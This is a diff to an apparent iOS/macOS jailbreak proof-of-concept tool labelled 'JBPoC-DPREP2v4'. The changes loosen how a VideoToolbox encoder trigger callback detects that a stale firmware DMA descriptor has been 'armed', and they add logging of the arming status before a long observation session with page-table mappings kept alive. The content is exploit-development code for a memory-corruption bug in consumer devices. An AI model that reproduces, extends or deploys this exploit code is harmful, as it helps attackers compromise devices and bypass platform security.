@@ -3795,15 +3795,27 @@ static void dprep2Callback(
     }
 }
 
-// Isolated trigger-session callback — only watches for -17691
+// Isolated trigger-session callback — any error without a sample = arm
+static volatile int g_dp2ArmedStatus = 0;
+
 static void dprep2TriggerCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
     VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
-    INFO(@"[TRIGGER-CB] status=%d", (int)status);
-    if (status == -17691) {
+    INFO(@"[TRIGGER-CB] status=%d sampleBuffer=%s",
+         (int)status, sampleBuffer ? "YES" : "NULL");
+    if (status != noErr && !sampleBuffer) {
         g_dp2Armed = YES;
-        PASS(@"[TRIGGER-CB] -17691 received — armed");
+        g_dp2ArmedStatus = (int)status;
+        if (status == -17691) {
+            PASS(@"[TRIGGER-CB] -17691 — classic arm");
+        } else {
+            PASS(@"[TRIGGER-CB] %d — alternate arm signature, continuing",
+                 (int)status);
+        }
         return;
+    }
+    if (status == noErr && sampleBuffer) {
+        FAIL(@"[TRIGGER-CB] encode SUCCEEDED — Alpha=255 not taken");
     }
 }
 
@@ -3971,6 +3983,7 @@ static void runDPrep2(void) {
     dp2FreeSamples();
     dp2FreeArchive();
     g_dp2Armed = NO;
+    g_dp2ArmedStatus = 0;
 
     // ARM: frame 0 — session's FIRST frame, matching phase2Encode topology
     g_dp2ArchiveArmMark = g_dp2ArchiveIdx;
@@ -4001,7 +4014,7 @@ static void runDPrep2(void) {
     }
 
     if (!g_dp2Armed) {
-        FAIL(@"Did not get -17691 after 130s.");
+        FAIL(@"Arm not detected after 130s (encodeFrame returned %d).", (int)status);
         LOG(@"Logging as no-fire run. Alpha set pre-prepare, frame 0.");
         LOG(@"NOT invalidating — trigger session stays alive.");
         LOG(@"If panic comes at ~160s, this is a watchdog-path variant.");
@@ -4022,8 +4035,8 @@ static void runDPrep2(void) {
         g_phase2Running = NO;
         return;
     }
-    PASS(@"Armed (-17691). Firmware DMA descriptor is stale-armed.");
-    os_log(dLog, "JBPoC-DPREP2v4-ARMED");
+    PASS(@"Armed (status=%d). Firmware DMA descriptor is stale-armed.", g_dp2ArmedStatus);
+    os_log(dLog, "JBPoC-DPREP2v4-ARMED status=%d", g_dp2ArmedStatus);
 
     // Step 3: OBSERVATION SESSION — continuous canary encode for 240s
     // Trigger session stays alive (PTEs mapped). Observation session is
